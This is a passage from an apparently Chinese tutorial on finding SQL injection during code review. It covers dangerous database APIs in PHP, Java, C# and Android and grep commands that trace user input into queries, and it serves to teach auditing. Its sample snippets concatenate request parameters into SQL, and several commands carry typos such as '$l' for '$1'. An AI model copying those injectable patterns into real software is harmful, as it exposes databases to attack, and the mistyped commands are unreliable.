<span class="token comment">//execute ()— 行给定的SQL语句，从指定的表中获取数据</span>
result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//addBatch () 一将指定的SQL命令添加到当前命令列表中</span>
statement<span class="token punctuation">.</span><span class="token function">addBatch</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
statement<span class="token punctuation">.</span><span class="token function">addBatch</span><span class="token punctuation">(</span>more_aql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h5><p>.NET开发使用下列命名空间</p>
<pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">System.Data.SqlClient： SQL Server 的.NET Framework Data Provider(.NET 框架数据提供程序)
System.Data.OleDb： OLE DB 的.NET Framework Data Provider
System.Data.OracleClient： Oracle 的.NET Framework Data Providero
System.Data.Odbc: ODBC 的.NET Framework Data Provider<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">//SqlCommand()  用于构造或发送SQL语句或存储过程
SqlCommand command = new SqlCommand(sql, connection);
//SqlParameter()  用于向 SqlCommand 对象添加参数
SqlCommand command = new SqlCommand(sql,connection);
command.Parameters.Add("@param", SqlDbType.VarChar, 50).Value = input; 
//OleDbCommand()  用于构造或发送SQL语句或存储过程
OleDbCommand command = new OleDbCommand(sql,connection);
//OleDbParameter()  用于向 OleDbCommand 对象添加参数
OleDvCommand command = new OleDbCommand($sql,connection);
command.parameters.Add("@paran", OleDbType.VarChar, 50).Value = input; 
//OracleCommand()  用于构造/发送SQL语句或存储过程
oracleCommand command = new OracleCommand(sql,connection);
//OracleParameter()  用于向 OracleCommand 对象添加参数
OracleCommand command = new OracleCommand(sql,connection); command.Parameters.Add("@param", OleDbType.VarChar,50).Value = input; 
//OdbcCommand()  用于构造或发送SQL语句
OdbcCommand command = new OdbcCommand(sql,connection);
//OdbcParameter()  用于向 OdbcCommand 对象添加参数
OdbcCommand command = new OdbcCommand(sql,connection);
command.Parameters.Add("@paramn",OleDbType.VarChar,50) .Value = input;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="跟踪数据"><a href="#跟踪数据" class="headerlink" title="跟踪数据"></a>跟踪数据</h4><h5 id="跟踪PHP中的数据"><a href="#跟踪PHP中的数据" class="headerlink" title="跟踪PHP中的数据"></a>跟踪PHP中的数据</h5><p>首先注意到<code>register_globals</code>和<code>magic_quotes</code>的状态</p>
<p><code>register_globals</code>负责将EGPCS注册成全局变量，<code>magic_qoutes</code>过滤单引号、双引号、反斜线、NULL字符。</p>
<p>接下来排查代码，搜索php源文件目录，寻找<code>mssql_query()、mysql_query()、mysql_db_query()</code>作用：直接将用户输入插入SQL语句中</p>
<p>用以下命令打印匹配的内容文件名和行号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span>
<span class="token string">"\(mysql\|mssql\|mysql_db\)_query\(.*\$\(GET\|\POST\)"</span>.*<span class="token punctuation">\</span><span class="token punctuation">)</span><span class="token string">" src/ | awk -F: '{print "</span>filename: <span class="token string">"<span class="token variable">$l</span>"</span><span class="token punctuation">\</span>nline: <span class="token string">"<span class="token variable">$2</span>"</span><span class="token punctuation">\</span>nmatch: <span class="token string">"<span class="token variable">$3</span>"</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token string">"}'
filename: src/mssql_query.vuln.php
line: 11
match: <span class="token variable">$result</span> = mssql_query("</span>SELECT * FROM TBL WHERE COLUMN <span class="token operator">=</span><span class="token string">'$_GET['</span>var<span class="token string">']'</span><span class="token string">");
filename: src/mysql_query.vuln.php
line: 13
match: <span class="token variable">$result</span> = mysql_query("</span>SELECT * FROM TBL WHERE COLUMN <span class="token operator">=</span> <span class="token string">'$_GET['</span>var<span class="token string">']'</span>",<span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>寻找<code>oci_parse、ora_parse</code>作用：直接将用户输入插入SQL文件中，优先级大于<code>oci_exec、ora_exec、oci_execute</code></p>
<p>命令与前面相识</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span>  <span class="token string">"\(oci\|ora\)_parse\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span>
<span class="token function">awk</span> -F: <span class="token number">1</span><span class="token punctuation">{</span>print <span class="token string">"filename: "</span><span class="token variable">$l</span><span class="token string">"<span class="token entity" title="\n">\n</span>line: "</span><span class="token variable">$2</span><span class="token string">"<span class="token entity" title="\n">\n</span>match: "</span><span class="token variable">$3</span><span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">}</span><span class="token string">' 
filename: src/oci_parse.vuln.php
line: 4
match: $stid = oci_parse($conn, "SELECT * FROM TABLE WHERE COLUMN = '</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var1]'</span><span class="token string">");
filename: src/ora_parse.vuln.php
line: 13
match: ora_parse(<span class="token variable">$curs</span>,"</span>SELECT * FROM TABLE WHERE COLUMN <span class="token operator">=</span><span class="token string">'$_GET['</span>var<span class="token string">']'</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>寻找<code>odbc_prepare()、odbc_exec()</code>作用：直接将用户输入插入SQL文件中，<code>odbc_prepare()</code>先于<code>odbc_execute()</code>被编译成SQL语句</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\(odbc_prepare\|odbc_exec\)\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>寻找<code>mssql_bind()</code>作用：直接将用户输入插入到SQL文件中，优先级大于<code>mssql_execute()</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"mssql_bind\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:
<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#形如</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM TBL WHERE COLUMN = '$_GET['var']'"</span><span class="token punctuation">;</span>
$result <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span>$<span class="token keyword">sql</span><span class="token punctuation">,</span> $link<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面的命令不能匹配，将上面的命令合并优化得到</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"mssql_query(\|mysql_query(\|mysql_db_query(\|oci_parse (\|ora_parse(\|mssql_bind(\|mssql_execute(\|odbc_prepare(\|odbc_execute (\|odbc_execute(\|odbc_exec("</span>src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print
"filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>理想获得</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">20</span>
match: <span class="token variable">$result</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>mysql_query()向数据库发送一条查询，但不知道$sql的值，无法判断是否被污染，所以跟踪$sql变量</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$sql</span>"</span> src/ 丨 <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>
<span class="token comment">#变量可能重用，不采用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$sql</span> =.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>
<span class="token comment">#使用sql语句查找，缩小排查</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>理想获得</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">20</span>
match: <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '<span class="token variable">$_GET</span>['input']'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这是可以判断存在SQL注入</p>
<p>另一种情况</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">20</span>
match: <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '$ input'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>又不能判断$input 是否被污染，跟踪$input</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$input</span>=.*\$.*"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:	<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>理想结果</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">10</span>
match: <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>但是还是不能断定存在SQL注入，因为可以存在对$input的过滤</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$input</span>"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">11</span>
match: <span class="token keyword">if</span> <span class="token punctuation">(</span>is_string<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">))</span>	<span class="token punctuation">{</span>
filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">12</span>
match: <span class="token keyword">if</span> <span class="token punctuation">(</span>strlen<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$maxlength</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
filename: src/SQLi.MySQL.vulnerable.php
line: <span class="token number">13</span>
match: <span class="token keyword">if</span> <span class="token punctuation">(</span>ctype_alnum<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">))</span>	<span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>经过对过滤函数的分析，就能判断是否存在SQL注入</p>
<h5 id="跟踪Java中的数据"><a href="#跟踪Java中的数据" class="headerlink" title="跟踪Java中的数据"></a>跟踪Java中的数据</h5><p>在Java源文件的目录中，寻找是否存在使用了 prepareStatement()、 executeQuery()、executeUpdate()、addBatch()和 executeBatch()的文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"preparedStatement(\|executeQuery(\|executeUpdate(\|exe cute(\|addBatch(\|executeBatch("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:	<span class="token string">'{print "filename:"$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获得</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLVuln.java
line: <span class="token number">89</span>
match: ResultSet rs <span class="token operator">=</span> statement.executeQuery<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
filename: src/SQLVuln.java
line: <span class="token number">139</span>
match: statement.executeUpdate<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
filename: src/SQLVuln.java
line: <span class="token number">209</span>
match: ResultSet rs <span class="token operator">=</span> statement.executeQuery<span class="token punctuation">(</span><span class="token string">"
SELECT field FROM table WHERE field = "</span> +
request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>209行<code>input</code>是用户直接通过表单提交输入，存在SQL注入</p>
<p>还需对89,139行的sql进行跟踪判断是否被污染</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> - i <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"sql =.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>
filename: src/SQLVuln.java
line: <span class="token number">88</span>
match: String sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"SELECT field FROM table WHERE field = "</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
filename: src/SQLVuln.java
line: <span class="token number">138</span>
match: String sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"INSERT INTO table VALUES field = ("</span> +
request.getParameter <span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">") WHERE field = "</span> + request. getParameter <span class="token punctuation">(</span><span class="token string">"more-input"</span><span class="token punctuation">)</span> + "<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和前面一样，也存在SQL注入</p>
<p>找到渗入源</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"getParameter(\|getParameterValues(\|getQueryString (\|getHeader(\|getHeaders(\|getRequestedSessionld(\|getCookies(\|getValue("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="跟踪C-中的数据"><a href="#跟踪C-中的数据" class="headerlink" title="跟踪C#中的数据"></a>跟踪C#中的数据</h5><p>在一个C#源文件的目录中，寻找使用了 SqlCommand()、SqlParameter()、OleDbCommand()、OleDbParameter()、OracleCommand()、OracleParameter() 、OdbcCommand()和 OdbcParameter()的位置</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"SqlCommand(\|SqlParameter(\|OleDbCommand(\|OleDbParam eter(\|OracleCommand(\|OracleParameter(\|OdbcCommand(\|OdbcParameter("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>
filename: src/SQLiMSSQLVuln.cs
line: <span class="token number">29</span>
match: SqlCommand <span class="token builtin class-name">command</span> <span class="token operator">=</span> new SqlCommand<span class="token punctuation">(</span><span class="token string">"SELECT ★ FROM table WHERE field = '"</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">"'"</span>,conn<span class="token punctuation">)</span><span class="token punctuation">;</span>
filename: src/SQLiOracleVuln.cs
line: <span class="token number">69</span>
match: OracleCommand <span class="token builtin class-name">command</span> <span class="token operator">=</span> new OracleCommand<span class="token punctuation">(</span>sql, conn<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>29行<code>input</code>是用户直接通过表单提交输入，存在SQL注入</p>
<p>还需对69行的sql进行跟踪判断是否被污染</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"sql =.*<span class="token entity" title="\&quot;">\"</span> \(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ I <span class="token function">awk</span> -F:	<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>
filename: src/SQLiOracleVuln.cs
line: <span class="token number">68</span>
match: String sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '"</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">"'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>和前面一样，也存在SQL注入</p>
<p>找到渗入源</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"HttpCookieCollection\|Form\|Headers\|Params\|QuerySt ring\|Servervariables\|Url\|UserAgent\|UserHostAddress\|UserHostName"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="复查Android应用程序代码"><a href="#复查Android应用程序代码" class="headerlink" title="复查Android应用程序代码"></a>复查Android应用程序代码</h4><h5 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h5><p><a target="_blank" rel="noopener" href="http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/">WebContentResolver</a>，它可以运行在Android设备(或模拟器)上，并向 所有已安装的内容提供程序暴露Web Service接口。</p>
<p>dex2jar这样的工具可以轻而易举地将Android应用程序的包文件(APK) 转换为Java Archive (JAR)文件。然后，可以采用某种Java反汇编程序 比如jdgui或 jad,反编译应用程序并查看源代码。</p>
<h5 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h5><p>Android开发人员使用两个类与SQLite数据库进行交互：<code>SQLiteQueryBuilder</code>类和 <code>SQLiteDatabase</code>类。<code>android.database.sqlite.SQLiteQueryBuilder</code> 是一个便捷类，用于创建发送给SQLiteDatabase对象的SQL查询<code>android.database.sqlite.SQLiteDatabase</code> 类 则提供了用于管理 SQLite 数据库的各种方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//android.database.sqlite.SQLiteQueryBuilder</span>
<span class="token comment">//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句</span>
<span class="token function">buildQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projectionIn<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span>
<span class="token comment">//用指定的子句构造一个SQL查询字符串</span>
<span class="token function">buildQueryString</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> distinct<span class="token punctuation">,</span> <span class="token class-name">String</span> tables<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name"><span class="token namespace">columns<span class="token punctuation">.</span></span> String</span> <span class="token class-name"><span class="token namespace">where<span class="token punctuation">.</span></span> String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> orderBy<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span> 
<span class="token comment">//给定一组子查询，其中每一个都是SELECT语句，构造一个union所有这些子查询返回结果的查询 </span>
<span class="token function">buildUnionQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> subQueries<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span>
<span class="token comment">//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句</span>
<span class="token function">buildUnionSubQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeDiscriminatorColumn<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> unionColumns<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> columnsPresentInTable<span class="token punctuation">,</span> <span class="token keyword">int</span> computedColumnsOffset<span class="token punctuation">,</span> <span class="token class-name">String</span> typeDiscriminatorValue<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">)</span>
<span class="token comment">//结合所有当前设置和传递给该方法的信息，这些一个查询</span>
<span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase</span> db<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projectionin<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span>
<span class="token comment">//android.database.sqlite.SQLiteDatabase</span>
<span class="token comment">//在数据库中删除行的简便方法</span>
<span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">)</span>
<span class="token comment">//执行单个SQL语句，该SQL语句既不是SELECT语句，也不是任何其他返回数据的SQL语句 </span>
<span class="token function">execSQL</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span>
<span class="token comment">//执行单个SQL语句，该SQL语句不是SELECT/INSERT/UPDATE/DELETE语句</span>
<span class="token function">execSQL</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">sql<span class="token punctuation">.</span></span> Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bindArgs<span class="token punctuation">)</span>
<span class="token comment">//向数据库插入一行数据的便捷方法</span>
<span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span><span class="token class-name">Contentvalues</span> values<span class="token punctuation">)</span>
<span class="token comment">//向数据库插入一行数据的便捷方法</span>
<span class="token function">insertOrThrow</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span><span class="token class-name">Contentvalues</span> values<span class="token punctuation">)</span>
<span class="token comment">//向数据库插入一行数据的通用方法</span>
<span class="token function">insertWithOnConflict</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialvalues<span class="token punctuation">,</span> <span class="token keyword">int</span> conflictAlgorithm<span class="token punctuation">)</span>
<span class="token comment">//查询指定的表，返回结果集上的一个游标(Cursor)</span>
<span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> columns<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> orderBy<span class="token punctuation">,</span><span class="token class-name">String</span> limit<span class="token punctuation">)</span>
<span class="token comment">//查询指定的URL,返回结果集上的一个游标</span>
<span class="token function">queryWithFactory</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase<span class="token punctuation">.</span>CursorFactory</span> cursorFactory<span class="token punctuation">,</span> <span class="token keyword">boolean</span> distinct<span class="token punctuation">,</span> <span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> columns<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">selection<span class="token punctuation">.</span></span> String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">having<span class="token punctuation">.</span></span> String</span> orderBy<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span> 
<span class="token comment">//运行指定的SQL语句，返回结果集上的一个游标</span>
<span class="token function">rawQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">)</span>
<span class="token comment">//运行指定的SQL语句，返回结果集上的一个游标</span>
<span class="token function">rawQueryWithFactory</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase<span class="token punctuation">.</span>CursorFactory</span> cursorFactory<span class="token punctuation">,</span>
<span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> editTable<span class="token punctuation">)</span>
<span class="token comment">//替换数据库中数据行的便捷方法</span>
<span class="token function">replace</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialvalues<span class="token punctuation">)</span> 
<span class="token comment">//替换数据库中数据行的便捷方法</span>
